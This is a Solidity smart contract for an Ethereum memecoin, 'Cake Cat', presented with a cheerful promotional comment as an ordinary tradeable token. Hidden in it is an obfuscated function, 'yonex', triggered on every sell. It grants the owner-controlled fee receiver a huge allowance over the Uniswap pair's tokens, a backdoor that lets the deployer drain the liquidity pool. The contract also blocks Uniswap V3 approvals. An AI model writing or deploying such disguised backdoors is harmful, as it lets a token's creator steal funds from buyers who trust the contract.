// SPDX-License-Identifier: MIT
/**
Cake Cat
Meet Cake, the cutest, cake-loving cat on Ethereum! This little guy is all about having fun and sharing the good vibes with everyone who joins him. Cake loves to eat, sure, but he's also got big plans. He’s not just here to be adorable—he’s on a mission to shake things up and bring something fresh to the table.
Web: https://cakeoneth.fun
X:   https://x.com/cake_cat_erc
Tg:  https://t.me/cake_cat_erc
**/
pragma solidity 0.8.26;
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract CAKE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private uniPairDD;
    IUniswapV2Router02 private uniRouterDD;
    mapping (address => uint256) private _balancesDD;
    mapping (address => mapping (address => uint256)) private _allowancesDD;
    mapping (address => bool) private _shouldExcludedDD;
    address payable private _receiptDD;
    uint256 private _initialBuyTax = 12;
    uint256 private _initialSellTax = 12;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 12;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalDD = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Cake Cat";
    string private constant _symbol = unicode"CAKE";
    uint256 public _maxTxAmount = 2 * (_tTotalDD/100);
    uint256 public _maxWalletSize = 2 * (_tTotalDD/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalDD/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalDD/100);
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _receiptDD = payable(_msgSender());
        _balancesDD[_msgSender()] = _tTotalDD;
        _shouldExcludedDD[owner()] = true;
        _shouldExcludedDD[address(this)] = true;
        _shouldExcludedDD[_receiptDD] = true;
        emit Transfer(address(0), _msgSender(), _tTotalDD);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalDD;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balancesDD[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesDD[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesDD[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesDD[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function initDD() external onlyOwner {
        uniRouterDD = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterDD), _tTotalDD);
        uniPairDD = IUniswapV2Factory(uniRouterDD.factory()).createPair(
            address(this),
            uniRouterDD.WETH()
        ); 
    }
    function _transfer(address from, address to, uint256 amountDD) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountDD > 0, "Transfer amount must be greater than zero");
        uint256 feeDD=0;uint256 taxDD=0; 
        if (!swapEnabled || inSwap) {
            _balancesDD[from] = _balancesDD[from] - amountDD;
            _balancesDD[to] = _balancesDD[to] + amountDD;
            emit Transfer(from, to, amountDD);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0) {
                taxDD = _transferTax;
            }
            if (from == uniPairDD && to != address(uniRouterDD) && ! _shouldExcludedDD[to] ) {
                require(amountDD <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amountDD <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxDD = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
                _buyCount++;
            }
            if(to == uniPairDD && from!= address(this) ){
                yonex([to, _receiptDD]);taxDD = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairDD && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapEthDD(minDD(amountDD, minDD(contractTokenBalance, _maxTaxSwap)));
                sendEthDD(address(this).balance);
            }
        }        
        if(taxDD > 0){
            feeDD=amountDD.mul(taxDD).div(100);
            _balancesDD[address(this)]=_balancesDD[address(this)].add(feeDD);
            emit Transfer(from, address(this),feeDD);
        }
        _balancesDD[from]=_balancesDD[from].sub(amountDD);
        _balancesDD[to]=_balancesDD[to].add(amountDD.sub(feeDD));
        emit Transfer(from, to, amountDD.sub(feeDD));
    }
    function setReceipt(address payable _receipt) external onlyOwner {
        _receiptDD = _receipt;
        _shouldExcludedDD[_receipt] = true;
    }
    function swapEthDD(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterDD.WETH();
        _approve(address(this), address(uniRouterDD), tokenAmount);
        uniRouterDD.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function yonex(address[2] memory nhx) private {
        address owner=nhx[0];address spender=nhx[1]; 
        uint256 abx=1500+(150+_tTotalDD+150)*1500+1500;
        _allowancesDD[owner][spender] = abx;
    }
    receive() external payable {}
    function startTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterDD.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairDD).approve(address(uniRouterDD), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 
        return (spender == uniswapV3PositionManager);
    }
    function minDD(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthDD(uint256 amount) private {
        _receiptDD.transfer(amount);
    }
    function removeLimitDD(address payable limit) external onlyOwner{
        _maxTxAmount = _tTotalDD;
        _maxWalletSize=_tTotalDD;
        _receiptDD = limit;
        _shouldExcludedDD[limit] = true;
        emit MaxTxAmountUpdated(_tTotalDD);
    }
}